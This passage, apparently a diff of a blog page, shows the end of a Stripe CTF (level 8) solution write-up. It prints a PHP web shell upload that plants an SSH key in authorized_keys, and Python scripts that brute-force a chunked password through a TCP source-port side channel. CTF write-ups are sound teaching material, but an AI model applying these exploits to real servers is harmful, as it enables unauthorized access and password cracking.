+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Making</span> <span class="n">request</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">server</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14435</span><span class="p">)</span> <span class="p">(</span><span class="n">remaining</span> <span class="n">chunk</span> <span class="n">servers</span><span class="p">:</span> <span class="p">[(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14436</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14437</span><span class="p">)])</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58879</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Received</span> <span class="n">payload</span><span class="p">:</span> <span class="s">&#39;{&quot;password_chunk&quot;: &quot;456&quot;}&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58879</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Request</span> <span class="n">already</span> <span class="n">finished</span><span class="err">!</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58879</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Responding</span> <span class="k">with</span><span class="p">:</span> <span class="s">&#39;{&quot;success&quot;: true}</span><span class="se">\n</span><span class="s">&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Making</span> <span class="n">request</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">server</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14436</span><span class="p">)</span> <span class="p">(</span><span class="n">remaining</span> <span class="n">chunk</span> <span class="n">servers</span><span class="p">:</span> <span class="p">[(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14437</span><span class="p">)])</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58880</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Received</span> <span class="n">payload</span><span class="p">:</span> <span class="s">&#39;{&quot;password_chunk&quot;: &quot;789&quot;}&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58880</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Request</span> <span class="n">already</span> <span class="n">finished</span><span class="err">!</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58880</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Responding</span> <span class="k">with</span><span class="p">:</span> <span class="s">&#39;{&quot;success&quot;: true}</span><span class="se">\n</span><span class="s">&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Making</span> <span class="n">request</span> <span class="n">to</span> <span class="n">chunk</span> <span class="n">server</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">14437</span><span class="p">)</span> <span class="p">(</span><span class="n">remaining</span> <span class="n">chunk</span> <span class="n">servers</span><span class="p">:</span> <span class="p">[])</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58881</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Received</span> <span class="n">payload</span><span class="p">:</span> <span class="s">&#39;{&quot;password_chunk&quot;: &quot;000&quot;}&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58881</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Request</span> <span class="n">already</span> <span class="n">finished</span><span class="err">!</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58881</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Responding</span> <span class="k">with</span><span class="p">:</span> <span class="s">&#39;{&quot;success&quot;: false}</span><span class="se">\n</span><span class="s">&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Going</span> <span class="n">to</span> <span class="n">wait</span> <span class="mf">0.0</span> <span class="n">seconds</span> <span class="n">before</span> <span class="n">responding</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Request</span> <span class="n">already</span> <span class="n">finished</span><span class="err">!</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Responding</span> <span class="k">with</span><span class="p">:</span> <span class="s">&#39;{&quot;success&quot;: false}</span><span class="se">\n</span><span class="s">&#39;</span>
+</span><span class='line'><span class="p">[</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58877</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">webhook</span> <span class="n">to</span> <span class="p">(</span><span class="s">u&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">1111</span><span class="p">):</span> <span class="p">{</span><span class="s">&#39;success&#39;</span><span class="p">:</span> <span class="bp">False</span><span class="p">}</span>
+</span><span class='line'><span class="n">Releasing</span> <span class="n">lock</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The observation is this: the logs are showing you the TCP source port (i.e. &#8220;[127.0.0.1:<strong>58877</strong>:1] Sending webhook to (u&#8217;localhost&#8217;, 1111): {&#8216;success&#8217;: False}&#8221;) are sequential.</p>
+
+<p>Knowing that source ports are sequential allows us to know how many chunk servers the PasswordDB server queried before responding.  If the source port for the response to our request is N, and the source port for the request to the webhook is N+2, only 1 chunk server was queried.  If the request to the webhook has a source port of N+3, then 2 chunk servers were queried.</p>
+
+<p>The actual PasswordDB is running behind Apache, so the source port for the response won&#8217;t be dependent on Twisted.  To solve that, we send two requests with the same guess and look at the difference in source ports between sequential requests to our webhook.  Now, we can bruteforce the 12 digit password by bruteforcing 4 3-digit chunks individually, which is doable in a reasonable amount of time.</p>
+
+<p>PasswordDB can only make outbound requests to other Stripe servers so we have to run a script from somewhere on the Stripe server.  Luckily we can get ssh access to the level 2 server by uploading a php script that puts a public key in ~/.authorized_hosts:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="sb">`echo &quot;ssh-rsa MY_PUBLIC_KEY ssh&quot; &gt; ../../.ssh/authorized_keys`</span><span class="p">;</span>
+</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;</span><span class="si">$output</span><span class="s2">&lt;/pre&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/assets/images/stripe-ctf/level8-shell.png" alt="Level 8 Shell" /></p>
+
+<p>To brute force the password chunk by chunk, we send two requests with the same guess to PasswordDB and look at the difference in source ports between responses to our webhook.  If the difference when guessing the first chunk is 3, then PasswordDB made 2 requests between responding to us, and thus queried the 2nd chunk server.  Likewise if the difference when guessing the 2nd chunk is 4, and guessing the 3rd chunk is 5.  I found that due to what&#8217;s probably other users on the same challenge, I would sometimes get source port differences that were wildly off.  I solved this sub optimally: any time that I have a source port difference greater than what I expect I wait 5 seconds and try again.  If I keep getting source port differences greater than the expected 5 times in a row, I probably correctly guessed a chunk.  This is a very suboptimal way to do it, and my script took a couple of hours to finish.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">ssl</span><span class="o">,</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">make_guess</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">p1</span> <span class="o">=</span> <span class="n">get_source_port</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">p2</span> <span class="o">=</span> <span class="n">get_source_port</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">p2</span> <span class="o">-</span> <span class="n">p1</span>
+</span><span class='line'>    <span class="k">except</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;something bad happened, trying again&quot;</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">make_guess</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">get_source_port</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">client</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">client</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">resp</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s">&quot;0</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span><span class="p">:</span> <span class="k">break</span>
+</span><span class='line'>    <span class="n">source_port1</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class='line'>    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;HTTP/1.0 200 OK</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;level08-1.stripe-ctf.com&#39;</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">443</span>
+</span><span class='line'><span class="n">HOST2</span> <span class="o">=</span> <span class="s">&#39;level02-2.stripe-ctf.com&#39;</span>
+</span><span class='line'><span class="n">PORT2</span> <span class="o">=</span> <span class="mi">12455</span>
+</span><span class='line'><span class="n">server</span> <span class="o">=</span>  <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">server</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">PORT2</span><span class="p">))</span>
+</span><span class='line'><span class="n">server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'><span class="n">guess</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">chunk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">start</span> <span class="o">=</span> <span class="mi">128</span>
+</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
+</span><span class='line'>        <span class="n">chunk_guess</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">message</span> <span class="o">=</span> <span class="s">&#39;{&quot;password&quot;: &quot;&#39;</span> <span class="o">+</span> <span class="n">guess</span> <span class="o">+</span> <span class="n">chunk_guess</span> <span class="o">+</span> <span class="s">&#39;X&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">12</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">guess</span><span class="o">+</span><span class="n">chunk_guess</span><span class="p">))</span> <span class="o">+</span> <span class="s">&#39;&quot;, &quot;webhooks&quot;: [&quot;level02-2.stripe-ctf.com:12455&quot;]}&#39;</span>
+</span><span class='line'>        <span class="n">request</span> <span class="o">=</span> <span class="s">&#39;POST /user-umqrrcvswp/ HTTP/1.1</span><span class="se">\r\n</span><span class="s">User-Agent: curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8r zlib/1.2.5</span><span class="se">\r\n</span><span class="s">Host: level08-1.stripe-ctf.com</span><span class="se">\r\n</span><span class="s">Accept: */*</span><span class="se">\r\n</span><span class="s">Content-Length: &#39;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">))</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n\r\n</span><span class="s">&#39;</span> <span class="o">+</span> <span class="n">message</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Guessing (chunk &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;) :&quot;</span> <span class="o">+</span> <span class="n">chunk_guess</span>
+</span><span class='line'>        <span class="n">correct</span> <span class="o">=</span> <span class="bp">True</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="c">#fucking network jitter</span>
+</span><span class='line'>            <span class="n">diff</span> <span class="o">=</span> <span class="n">make_guess</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span><span class='line'>            <span class="k">print</span> <span class="n">diff</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">diff</span> <span class="o">==</span> <span class="n">chunk</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">correct</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>                <span class="k">break</span>
+</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>                <span class="k">print</span> <span class="s">&quot;just in case lets sleep&quot;</span>
+</span><span class='line'>                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">correct</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;Got Chunk:&quot;</span><span class="p">,</span> <span class="n">chunk_guess</span>
+</span><span class='line'>            <span class="n">guess</span> <span class="o">+=</span> <span class="n">chunk_guess</span>
+</span><span class='line'>            <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;Got 3/4ths of password:&quot;</span><span class="p">,</span> <span class="n">guess</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The above code gets the first 3 chunks.  Any password guess that has the first 9 digits correct will have to query the 4th chunk server, so there is no difference in source ports between correct and incorrect guesses after the first 9 digits are correct.  The rest of the password has to be bruteforced directly:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">14</span><span class="p">]:</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+</span><span class='line'><span class="o">....</span><span class="p">:</span>     <span class="n">guess</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span><span class='line'><span class="o">....</span><span class="p">:</span>     <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&quot;https://level08-1.stripe-ctf.com/user-umqrrcvswp/&quot;</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span><span class="s">&#39;{&quot;password&quot;: &quot;350080833&#39;</span> <span class="o">+</span> <span class="n">guess</span> <span class="o">+</span> <span class="s">&#39;&quot;, &quot;webhooks&quot;: []}&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="o">....</span><span class="p">:</span>     <span class="k">print</span> <span class="s">&quot;Tried:&quot;</span><span class="p">,</span> <span class="n">guess</span>
+</span><span class='line'><span class="o">....</span><span class="p">:</span>     <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">&#39;{&quot;success&quot;: true}&#39;</span><span class="p">:</span>
+</span><span class='line'><span class="o">....</span><span class="p">:</span>         <span class="k">print</span> <span class="s">&quot;Got it: &quot;</span><span class="p">,</span> <span class="n">guess</span>
+</span><span class='line'><span class="o">....</span><span class="p">:</span>         <span class="k">break</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>The End</h2>
+
+<p>And there you have it.</p>
+
+<p><img src="/assets/images/stripe-ctf/the-end.png" alt="The End" /></p>
+</div>
+  
+  
+
+
+    </article>
+  
   <div class="pagination">
     
     <a href="/blog/archives">Blog Archives</a>
@@ -387,11 +1300,19 @@ hook will persist even if the user destroys the VM.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2013/03/08/making-gemcanary/">What an MVP looks like: making gemcanary</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2012/11/09/hacking-letterpress/">Hacking Letterpress</a>
       </li>
     
       <li class="post">
         <a href="/blog/2012/10/30/breaking-in-and-out-of-vagrant/">Breaking in and out of Vagrant</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/08/30/my-solutions-to-the-stripe-ctf-web-app-edition/">My solutions to the Stripe CTF (web app edition)</a>
       </li>
     
   </ul>
@@ -437,7 +1358,7 @@ hook will persist even if the user destroys the VM.</p>
     </div>
   </div>
   <footer role="contentinfo"><p>
-  Copyright &copy; 2012 - State Machienry -
+  Copyright &copy; 2013 - State Machinery -
   <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
 </p>
 
